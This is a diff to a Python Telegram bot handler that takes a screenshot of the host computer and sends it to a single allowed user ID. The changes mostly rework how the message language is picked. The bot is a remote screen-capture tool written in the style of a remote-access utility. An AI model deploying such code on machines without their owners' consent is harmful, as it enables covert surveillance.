@@ -16,33 +16,29 @@
 ##  \_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_/
 
 
-
 from aiogram import types, F
 from aiogram.types import BufferedInputFile
 from aiogram.filters import Command
 from io import BytesIO
 import pyautogui
-from lib.text.texts import TEXTS, user_languages
 
+
+from lib.text.texts import TEXTS, user_languages
 from config import ALLOWED_USER_ID
  
+
 def register_screenshot_handlers(dp):
     @dp.message((F.text.lower() == "скриншот") | (F.text.lower() == "screenshot"))
     @dp.message(Command("screenshot"))
     async def send_photo(message: types.Message):
         user_id = message.from_user.id
-
-        # Определяем язык по кнопке или по словарю
-        if message.text.lower() == "скриншот":
-            lang = 'ru'
-        else:
-            lang = user_languages.get(user_id, 'en')
+        lang = user_languages.get(user_id, 'ru')
 
         if user_id != ALLOWED_USER_ID:
-            await message.answer(TEXTS[lang].get("access_denied", "You do not have access to this bot."))
+            await message.answer(TEXTS[lang]['access_denied'])
             return
 
-        await message.answer(TEXTS[lang].get("screenshot_start", "Taking screenshot now, root..."))
+        await message.answer(TEXTS[lang]['screenshot_start'])
 
         try:
             screenshot = pyautogui.screenshot()
@@ -54,4 +50,4 @@ def register_screenshot_handlers(dp):
             await message.answer_photo(photo)
 
         except Exception as e:
-            await message.answer(TEXTS[lang].get("screenshot_error", f"Error sending screenshot: {e}"))
+            await message.answer(TEXTS[lang][f'screenshot_error'])
